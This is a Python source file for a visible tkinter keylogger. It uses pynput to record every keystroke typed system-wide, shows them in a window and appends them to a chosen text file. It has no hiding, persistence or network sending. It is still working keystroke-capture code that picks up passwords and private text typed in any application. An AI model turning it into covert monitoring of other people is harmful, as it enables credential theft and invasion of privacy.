import tkinter as tk
from tkinter import filedialog
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""

        # Initialize the Tkinter window
        self.root = tk.Tk()
        self.root.title("Keylogger")

        # Textbox to display logged keys
        self.textbox = tk.Text(self.root, wrap="word")
        self.textbox.pack(fill="both", expand=True)

        # Status label to show logging status
        self.status_label = tk.Label(self.root, text="Logging Stopped", fg="red")
        self.status_label.pack(pady=5)

        # Start logging button
        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(side="left", padx=5, pady=5)

        # Stop logging button
        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging, state="disabled")
        self.stop_button.pack(side="left", padx=5, pady=5)

        # Clear logs button
        self.clear_button = tk.Button(self.root, text="Clear Logs", command=self.clear_logs)
        self.clear_button.pack(side="left", padx=5, pady=5)

        # Choose file button
        self.save_button = tk.Button(self.root, text="Choose File", command=self.choose_file)
        self.save_button.pack(side="left", padx=5, pady=5)

    @staticmethod
    def get_char(key):
        try:
            return key.char if key.char is not None else str(key)
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)  # Automatically scroll down
        if self.filename:
            with open(self.filename, 'a') as logs:
                logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            if not self.filename:
                self.choose_file()
            if self.filename:
                self.is_logging = True
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.status_label.config(text="Logging Started", fg="green")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.status_label.config(text="Logging Stopped", fg="red")
            self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                      filetypes=[("Text files", "*.txt"), ("All files", "*.*")])

    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
